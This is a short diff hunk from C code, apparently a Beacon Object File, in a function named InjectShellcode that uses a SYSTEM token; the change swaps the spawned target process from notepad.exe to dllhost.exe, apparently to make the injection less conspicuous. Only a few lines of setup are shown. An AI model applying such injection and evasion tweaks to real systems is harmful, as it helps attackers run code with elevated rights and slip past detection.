@@ -162,7 +162,7 @@ BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcod
     LPVOID pRemoteCode;
     SIZE_T bytesWritten;
     HANDLE hThread;
-    wchar_t target[] = L"C:\\Windows\\System32\\notepad.exe";
+    wchar_t target[] = L"C:\\Windows\\System32\\dllhost.exe";
 
     MSVCRT$memset(&si, 0, sizeof(si));
     MSVCRT$memset(&pi, 0, sizeof(pi));
